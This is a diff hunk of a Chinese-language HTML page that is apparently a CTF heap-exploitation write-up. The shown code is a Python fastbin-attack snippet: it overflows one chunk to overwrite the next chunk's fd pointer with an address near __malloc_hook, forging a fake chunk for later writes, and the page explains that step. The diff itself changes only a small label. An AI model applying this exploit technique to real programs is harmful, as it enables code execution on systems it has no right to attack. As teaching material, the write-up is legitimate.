@@ -3056,7 +3056,7 @@
 <h4 id="覆盖chunk2的fd字段伪造fake-chunk"><a href="#覆盖chunk2的fd字段伪造fake-chunk" class="headerlink" title="覆盖chunk2的fd字段伪造fake chunk"></a>覆盖chunk2的fd字段伪造fake chunk</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget = base + one[<span class="number">1</span>]</span><br><span class="line">malloc_hook = base + so.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fkfd = malloc_hook - <span class="number">0x23</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">fill(<span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">3</span> * <span class="number">8</span> + p64(<span class="number">0x71</span>) + p64(fkfd))</span><br></pre></td></tr></table></figure>
 
 <p>覆盖前:</p>
-<p><code>Fast bin -&gt; chunk2</code></p>
+<p><code>(0x60 bytes)Fast bin -&gt; chunk2</code></p>
 <p>覆盖后:</p>
 <p><code>(0x60 bytes)Fast bin -&gt; chunk2 -&gt; fake chunk</code></p>
 <p>再申请两个size均为0x60的chunk就能获取到对fake chunk 也就是<code>__malloc_hook</code>所在内存区域进行写的能力了</p>
